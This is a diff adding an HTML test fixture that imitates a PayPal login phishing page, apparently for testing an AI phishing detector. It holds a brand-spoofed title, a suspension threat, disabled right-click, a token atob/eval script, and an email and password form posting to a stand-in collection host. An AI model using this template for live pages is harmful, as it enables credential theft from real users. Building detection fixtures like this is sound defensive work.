@@ -1,0 +1,17 @@
+<!doctype html><html data-test="n10"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width">
+<title>PayPal: Log in to your account</title>
+<link rel="icon" href="https://www.paypalobjects.example/favicon.ico">
+<!-- n10: shaped like a phishing kit for Rift AI's page model (§16.1). Harmless: nothing loads from the
+     addresses below (the proxy refuses them in the test), and the form is never submitted. -->
+</head>
+<body oncontextmenu="return false" style="font:18px sans-serif">
+<p>Your account has been limited. Verify your identity within 24 hours or it will be suspended.</p>
+<form action="https://collect.example/post.php" method="post">
+<input type="hidden" name="a" value="1"><input type="hidden" name="b" value="2"><input type="hidden" name="c" value="3">
+<p><label>Email <input name="email"></label></p>
+<p><label>Password <input type="password" name="password"></label></p>
+<p><button type="button">Log In</button></p>
+</form>
+<p><a href="#">Forgot password?</a> <a href="#">Help</a> <a href="javascript:void(0)">Privacy</a> <a href="#">Legal</a></p>
+<script>var k = atob('cmlmdA=='); eval('1');</script>
+</body></html>
